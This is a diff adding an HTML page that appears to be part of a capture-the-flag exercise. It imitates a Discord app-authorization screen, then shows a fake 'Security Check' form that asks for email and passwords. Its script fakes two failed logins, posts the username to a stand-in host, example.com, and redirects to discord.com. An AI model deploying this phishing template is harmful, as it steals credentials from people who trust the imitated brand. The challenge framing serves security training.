@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Authorize App</title>
+    <style>
+        /* DISCORD THEME EMULATION */
+        :root {
+            --bg-primary: #313338;
+            --bg-secondary: #2b2d31;
+            --bg-tertiary: #1e1f22;
+            --brand-color: #5865F2;
+            --brand-hover: #4752c4;
+            --text-normal: #dbdee1;
+            --text-header: #f2f3f5;
+            --text-muted: #949ba4;
+            --input-bg: #1e1f22;
+            --danger: #da373c;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: var(--text-normal);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* CARD STYLES */
+        .card {
+            background-color: var(--bg-secondary);
+            width: 440px;
+            padding: 32px;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            text-align: center;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeIn 0.5s forwards;
+            display: none; /* Hidden by default, controlled by JS */
+        }
+
+        .card.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* TYPOGRAPHY */
+        h3 {
+            color: var(--text-header);
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        p {
+            color: var(--text-muted);
+            font-size: 16px;
+            margin-top: 0;
+            line-height: 1.4;
+        }
+
+        /* BUTTONS */
+        .btn {
+            background-color: var(--brand-color);
+            color: white;
+            border: none;
+            border-radius: 3px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+            margin-top: 20px;
+        }
+
+        .btn:hover {
+            background-color: var(--brand-hover);
+        }
+
+        .btn-cancel {
+            background-color: transparent;
+            margin-top: 10px;
+        }
+        .btn-cancel:hover {
+            text-decoration: underline;
+            background-color: transparent;
+        }
+
+        /* FORMS */
+        .form-group {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            color: var(--text-muted);
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            background-color: var(--input-bg);
+            border: none;
+            padding: 10px;
+            height: 40px;
+            border-radius: 3px;
+            color: var(--text-normal);
+            box-sizing: border-box;
+            font-size: 16px;
+            outline: none;
+        }
+
+        input:focus {
+            background-color: var(--input-bg); /* Keep same but maybe lighter border logic if needed */
+        }
+
+        /* LOGO */
+        .logo {
+            margin-bottom: 20px;
+        }
+        
+        /* OAUTH PERMISSIONS LIST */
+        .permissions-list {
+            text-align: left;
+            background: var(--bg-tertiary);
+            padding: 10px;
+            border-radius: 4px;
+            margin: 15px 0;
+        }
+        .perm-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        .check-icon {
+            color: var(--brand-color);
+            margin-right: 10px;
+            font-weight: bold;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="card active" id="oauth-step">
+        <div class="logo">
+            <img src="discord.png">
+        </div>
+
+        <p>wants to access your account</p>
+
+        <div class="permissions-list">
+            <div class="perm-item">
+                <span class="check-icon">✓</span> Access your username and avatar
+            </div>
+            <div class="perm-item">
+                <span class="check-icon">✓</span> Read your message history
+            </div>
+            <div class="perm-item">
+                <span class="check-icon">✓</span> Give you the flag
+            </div>
+        </div>
+        
+        <p style="font-size: 12px; margin-top: 20px;">
+            Signed in as <strong>SigmaBoy</strong> <br>
+            <span style="color: var(--danger);">Not you?</span>
+        </p>
+        <!-- 
+        Good starting point ! You try to investigate how the "Authorize" button works.
+        Flag 15: 
+        -->
+        <button class="btn" onclick="goToStep2()">Authorize</button>
+        <button class="btn btn-cancel">Cancel</button>
+    </div>
+
+    <div class="card" id="phishing-step">
+        <div class="logo">
+             <h3 style="color: var(--text-header);">Security Check</h3>
+             <p>To continue, please verify your identity.</p>
+        </div>
+
+        <form id="resetForm" onsubmit="captureCredentials(event)">
+            <div class="form-group">
+                <label for="username">Email or Phone Number</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="old_pass">Current Password</label>
+                <input type="password" id="old_pass" name="old_pass" required>
+            </div>
+
+            <div class="form-group">
+                <label for="new_pass">New Password</label>
+                <input type="password" id="new_pass" name="new_pass" required>
+            </div>
+
+            <button type="submit" class="btn">Verify & Continue</button>
+        </form>
+    </div>
+
+    <script>
+
+        let attemptCount = 0;
+        // Transition from OAuth screen to Form
+        function goToStep2() {
+            const step1 = document.getElementById('oauth-step');
+            const step2 = document.getElementById('phishing-step');
+            
+            step1.style.display = 'none';
+            step2.classList.add('active');
+        }
+        function captureCredentials(e) {
+            e.preventDefault();
+            
+            const user = document.getElementById('username').value;
+            const oldP = document.getElementById('old_pass').value;
+            const newP = document.getElementById('new_pass').value;
+            if (attemptCount < 2) {
+                attemptCount++;
+                alert("Incorrect email or password. Please try again.");
+                oldPassField.value = "";
+                newPassField.value = "";
+                oldPassField.focus();
+                
+                return; 
+            }
+            const targetUrl = 'https://example.com/reset';
+
+            fetch(targetUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: user,
+                    // old_password: oldP,
+                    // new_password: newP,
+                    old_password: "your-stolen-password",
+                    new_password: "your-stolen-password",
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => {
+                console.log("Error: Connection to verification server failed.");
+            })
+            .catch(error => {
+                console.log("Network Error.");
+            });
+            window.location.href = "https://discord.com";
+        }
+    </script>
+</body>
+</html>
